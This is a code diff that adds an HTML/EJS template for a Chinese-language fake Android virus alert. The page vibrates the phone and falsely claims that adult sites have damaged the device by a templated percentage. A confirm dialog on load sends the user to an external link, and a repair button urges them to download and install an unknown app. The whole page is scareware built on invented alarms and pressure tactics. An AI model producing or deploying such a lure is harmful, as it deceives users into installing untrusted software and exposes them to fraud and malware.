@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title><%= title %></title>
+
+    <script>
+        if("vibrate" in navigator)
+          window.navigator.vibrate(500);
+        var message = "<%= alert_mes %>";
+        if(confirm(message))
+          window.location.href = "http://cloud.ccu.edu.tw/?link=38a8MNeQCm";
+    </script>
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+    <link rel = "stylesheet" href = "css/style.css" />
+  </head>
+  <body>
+    <div class = "main-bg">
+      <div class = "container">
+        <h1><blink><strong>注意!</strong>您的Android系統遭受損壞!!</blink></h1>
+        <br>
+        <div class = "main-warning">
+          您的系統受到<%= nVirus %>種病毒的嚴重破壞!! <br>
+          我們檢測到您的Android手機 : <%= device_model %>由於近期成人網站的<%= nVirus %>種有害病毒而損壞了<%= damagedPersent %>％。 <br>
+          很快，它會損壞手機的SIM卡，並會損壞您的聯繫人，照片，數據，應用程序等。 <br>
+          <br>
+          <br>
+          如果您現在不刪除病毒，會對您的手機造成嚴重傷害。<br>
+          以下是您需要做的（一步一步）： <br><br>
+          <div style = "display:inline-block;">
+            <div style = "text-align:left;">
+              <ul>
+                <li>步驟1：點擊按鈕並安裝下載的應用程序<br></li>
+                <li>步驟2：打開應用程序，加快和修復您的瀏覽器！<br></li>
+              </ul>
+            </div>
+          </div>
+          <br>
+          警告！！！ <br><br>
+          這個Android手機 : <%= device_model %>被感染了病毒，瀏覽器嚴重受損。您需要清除病毒並立即進行更正<br><br>
+          現在需要刪除和修復。
+
+          <br>
+
+          不要關閉這個窗口<br>
+
+          ***如果你離開，你將面臨危險***
+          <p>
+            <a href = "http://cloud.ccu.edu.tw/?link=38a8MNeQCm" class = "btn btn-primary" style = "font-size:20px;">修復它!!</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+
+    <script src = "https://code.jquery.com/jquery-3.2.1.min.js"></script>
+    <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+  </body>
+</html>
